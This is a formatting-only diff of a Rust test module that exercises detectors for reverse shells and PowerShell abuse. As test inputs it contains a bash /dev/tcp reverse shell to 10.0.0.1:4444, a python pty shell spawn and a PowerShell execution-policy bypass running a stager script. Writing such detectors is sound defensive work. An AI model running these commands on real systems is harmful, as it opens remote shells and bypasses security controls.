@@ -107,7 +107,9 @@ mod tests {
     // --- is_reverse_shell_pattern ---
     #[test]
     fn detects_bash_i_reverse_shell() {
-        assert!(is_reverse_shell_pattern("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"));
+        assert!(is_reverse_shell_pattern(
+            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+        ));
     }
 
     #[test]
@@ -117,7 +119,9 @@ mod tests {
 
     #[test]
     fn detects_python_c_pty_spawn() {
-        assert!(is_reverse_shell_pattern("python -c 'import pty; pty.spawn(\"/bin/sh\")'"));
+        assert!(is_reverse_shell_pattern(
+            "python -c 'import pty; pty.spawn(\"/bin/sh\")'"
+        ));
     }
 
     #[test]
@@ -151,7 +155,9 @@ mod tests {
 
     #[test]
     fn detects_ep_bypass() {
-        assert!(is_powershell_abuse("powershell -ep bypass -File stager.ps1"));
+        assert!(is_powershell_abuse(
+            "powershell -ep bypass -File stager.ps1"
+        ));
     }
 
     #[test]
